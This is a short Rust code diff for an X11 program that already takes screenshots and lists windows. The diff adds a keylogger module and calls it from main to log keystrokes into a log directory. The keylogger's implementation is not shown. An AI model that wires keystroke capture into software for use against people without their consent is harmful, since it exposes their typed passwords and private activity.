@@ -1,9 +1,12 @@
 pub mod screenshot;
 pub mod dispatcher;
 pub mod x11_windows;
+pub mod keylogger;
+
 use x11_windows::{get_windows, Window};
 use screenshot::screenshot_full;
 use std::sync::Arc;
+
 
 use std::{
     path::Path,
@@ -55,4 +58,6 @@ fn main() {
     };
 
     screenshot_full(Path::new(&config.clone().logdir)).unwrap();
+
+    keylogger::run(Path::new(LOG_DIR));
 }
